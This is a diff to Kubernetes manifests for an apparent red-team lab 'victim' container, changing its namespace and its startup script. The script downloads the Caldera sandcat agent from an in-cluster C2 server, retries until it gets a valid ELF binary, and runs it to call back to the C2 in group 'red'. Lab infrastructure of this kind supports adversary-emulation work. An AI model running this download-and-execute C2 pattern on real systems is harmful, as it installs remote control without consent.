@@ -6,37 +6,49 @@ apiVersion: v1
 kind: ConfigMap
 metadata:
   name: caldera-victim-script
-  namespace: caldera
+  namespace: piap
 data:
   start.sh: |
     #!/bin/bash
     set -e
 
     echo "[victim] Installing tools..."
-    apt-get update -qq && apt-get install -y -qq curl wget iputils-ping netcat-openbsd 2>/dev/null || true
+    apt-get update -qq && apt-get install -y -qq curl wget iputils-ping netcat-openbsd file 2>/dev/null || true
 
     echo "[victim] Waiting for Caldera C2 to be ready..."
-    until curl -sf --max-time 3 http://caldera.caldera.svc.cluster.local:8888 > /dev/null 2>&1; do
+    until curl -sf --max-time 3 http://caldera.piap.svc.cluster.local:8888 > /dev/null 2>&1; do
       echo "[victim] Caldera not ready, retrying in 15s..."
       sleep 15
     done
 
-    echo "[victim] Caldera is up — downloading sandcat agent..."
-    curl -s -X POST \
-      -H "file:sandcat.go-linux" \
-      -H "platform:linux" \
-      http://caldera.caldera.svc.cluster.local:8888/file/download \
-      -o /tmp/sandcat
+    echo "[victim] Caldera is up — waiting for sandcat agent binary to be compiled..."
+    while true; do
+      curl -s -X POST \
+        -H "file:sandcat.go-linux" \
+        -H "platform:linux" \
+        http://caldera.piap.svc.cluster.local:8888/file/download \
+        -o /tmp/sandcat
+
+      # Verify we got a real ELF binary (not an error page)
+      if [ -s /tmp/sandcat ] && file /tmp/sandcat | grep -q "ELF"; then
+        echo "[victim] Agent binary downloaded successfully."
+        break
+      else
+        echo "[victim] Agent binary not ready yet, retrying in 10s..."
+        rm -f /tmp/sandcat
+        sleep 10
+      fi
+    done
 
     chmod +x /tmp/sandcat
     echo "[victim] Agent downloaded. Connecting to C2 (group: red)..."
-    /tmp/sandcat -server http://caldera.caldera.svc.cluster.local:8888 -group red -v
+    /tmp/sandcat -server http://caldera.piap.svc.cluster.local:8888 -group red -v
 ---
 apiVersion: apps/v1
 kind: Deployment
 metadata:
   name: caldera-victim
-  namespace: caldera
+  namespace: piap
   labels:
     app: caldera-victim
     io.kompose.service: caldera-victim
